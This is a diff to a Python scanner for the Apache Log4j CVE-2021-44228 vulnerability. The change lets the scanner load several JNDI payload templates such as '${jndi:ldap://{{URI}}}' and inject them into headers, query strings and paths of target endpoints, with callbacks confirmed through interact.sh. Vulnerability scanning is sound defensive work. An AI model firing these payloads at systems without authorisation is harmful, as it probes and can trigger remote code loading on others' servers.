@@ -27,8 +27,8 @@ try:
 except Exception:
     pass
 
-TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
-INTERACTSH_PAYLOAD = "${jndi:ldap://HOST}"
+DEFAULT_PAYLOADS = ["${jndi:ldap://{{URI}}}"]
+DEFAULT_URI = "{{HOST}}/{{ID}}"
 INTERACTSH_SERVER = "interact.sh"
 INTERACTSH_REGEX = re.compile("(\w)+\.\w+")
 HEADERS = [
@@ -112,7 +112,7 @@ class Interactsh:
 
     def build_payload(self, payload, flag):
         url = f'{flag}.{self.domain}'
-        return payload.replace("HOST", url)
+        return build_payload(payload, url)
 
 
 def get_arguments():
@@ -132,9 +132,15 @@ def get_arguments():
     parser.add_argument("--https",
                         action="store_true",
                         help="Test HTTPS on domains without explicit schema")
-    parser.add_argument("-p", "--payload",
-                        action="store",
-                        help="template of the testing payload to use")
+    payload_group = parser.add_mutually_exclusive_group()
+    payload_group.add_argument("-p", "--payload",
+                               dest="payloads",
+                               action="append",
+                               help="add payload template to test")
+    payload_group.add_argument("--payload-file",
+                               dest="payload_file",
+                               action="store",
+                               help="file with payload templates to test")
     parser.add_argument("--host",
                         action="store",
                         default=INTERACTSH_SERVER,
@@ -174,6 +180,8 @@ def get_arguments():
                         action="store",
                         dest="interact_token",
                         help="Custom interact.sh token")
+    parser.add_argument("-u", "--uri",
+                        dest="uri")
     test_group = parser.add_argument_group("Tests", "[default: Headers, Query, Path]")
     test_group.add_argument("--headers",
                             action="append_const",
@@ -191,10 +199,12 @@ def get_arguments():
                             const="Path",
                             help="test path injection")
     args = parser.parse_args()
-    if args.tests is None:
+    if not args.tests:
         args.tests = ["Headers", "Query", "Path"]
-    if args.payload is None:
-        args.payload = INTERACTSH_PAYLOAD if args.auto else TESTING_PAYLOAD
+    if args.payload_file:
+        args.payloads = read_file_rows(args.payload_file)
+    if not args.payloads:
+        args.payloads = DEFAULT_PAYLOADS
     return args
 
 
@@ -216,8 +226,12 @@ def get_entries(filename):
         return lines
 
 
-def build_testing_payload(id, host, payload):
-    return payload.replace("HOST", host).replace("ID", id)
+def build_payload(template, uri):
+    return template.replace("{{URI}}", uri)
+
+
+def build_uri(template, host, id):
+    return template.replace("{{HOST}}", host).replace("{{ID}}", id)
 
 
 def generate_endpoint_id(endpoint):
@@ -228,19 +242,21 @@ def generate_mappings(endpoints):
     return {generate_endpoint_id(endpoint): endpoint for endpoint in endpoints}
 
 
-async def test_entry(current, total, endpoint, payload, id, args):
+async def test_entry(current, total, endpoint, payloads, id, args):
     cprint(f"[*] [{current + 1}/{total}] [ID: {id}] Testing endpoint {endpoint}", "green")
-    if args.verbose:
-        cprint(f"[%] Payload: {payload}", color="cyan")
 
-    tasks = []
-    async with httpx.AsyncClient(verify=False, timeout=args.timeout, proxies=args.proxy) as client:
-        for test_key, test_fun in TESTS_LIST:
-            try:
-                tasks.append(asyncio.create_task(test_fun(client, endpoint, payload, args)))
-            except Exception as e:
-                cprint(f"[!] [{test_key}] Test failed with: {e}", color="red")
-        await asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED)
+    for payload in payloads:
+        if args.verbose:
+            cprint(f"[%] Payload: {payload}", color="cyan")
+
+        tasks = []
+        async with httpx.AsyncClient(verify=False, timeout=args.timeout, proxies=args.proxy) as client:
+            for test_key, test_fun in TESTS_LIST:
+                try:
+                    tasks.append(asyncio.create_task(test_fun(client, endpoint, payload, args)))
+                except Exception as e:
+                    cprint(f"[!] [{test_key}] Test failed with: {e}", color="red")
+            await asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED)
 
 
 def get_endpoints_from_entries(entries, http, https):
@@ -284,9 +300,6 @@ async def test_header(client, endpoint, payload, args):
         headers = HEADERS
     headers = {header: payload for header in headers}
 
-    if args.verbose:
-        cprint("[%] [Headers] Start request", color="blue")
-
     try:
         await client.get(endpoint, headers=headers)
     except Exception as e:
@@ -299,8 +312,6 @@ async def test_header(client, endpoint, payload, args):
 
 async def test_get(client, endpoint, payload, args):
     params = {"id": payload}
-    if args.verbose:
-        cprint("[%] [Query] Start request", color="blue")
 
     try:
         await client.get(endpoint, params=params)
@@ -314,9 +325,6 @@ async def test_get(client, endpoint, payload, args):
 
 async def test_path(client, endpoint, payload, args):
     url = parse.urljoin(endpoint, parse.quote(payload, safe=''))
-
-    if args.verbose:
-        cprint("[%] [Path] Start request", color="blue")
 
     try:
         await client.get(url)
@@ -335,8 +343,8 @@ TESTS_LIST = [("Headers", test_header),
 
 def execute_manual(mappings, args):
     for i, id, endpoint in [(i, elem[0], elem[1]) for elem, i in zip(mappings.items(), range(len(mappings)))]:
-        testing_payload = build_testing_payload(id, args.host, args.payload)
-        asyncio.run(test_entry(i, len(mappings), endpoint, testing_payload, id, args))
+        payloads = [build_payload(payload, build_uri(args.uri, args.host, id)) for payload in args.payloads]
+        asyncio.run(test_entry(i, len(mappings), endpoint, payloads, id, args))
 
 
 def execute_interactsh(mappings, args):
@@ -344,8 +352,8 @@ def execute_interactsh(mappings, args):
     service = Interactsh(args.interact_token, args.host)
 
     for i, id, endpoint in [(i, elem[0], elem[1]) for elem, i in zip(mappings.items(), range(len(mappings)))]:
-        testing_payload = service.build_payload(args.payload, id)
-        asyncio.run(test_entry(i, len(mappings), endpoint, testing_payload, id, args))
+        payloads = [service.build_payload(payload, id) for payload in args.payloads]
+        asyncio.run(test_entry(i, len(mappings), endpoint, payloads, id, args))
 
     print()
     cprint("[*] Start verification", color="cyan", attrs=["bold", "underline"])
@@ -380,6 +388,12 @@ def main():
     """, color="yellow")
     cprint("[*] Apache Log4j CVE-2021-44228 Scanner", color="yellow")
     cprint("[*] Author: Federico Rapetti <Reply Communication Valley>", color="yellow")
+    print()
+
+    cprint("[*] Loaded payloads:", color="cyan", attrs=["bold", "underline"])
+    for payload in args.payloads:
+        cprint(f"[*] - {payload}", color="magenta")
+
     print()
     if args.filename is not None:
         entries = get_entries(args.filename)
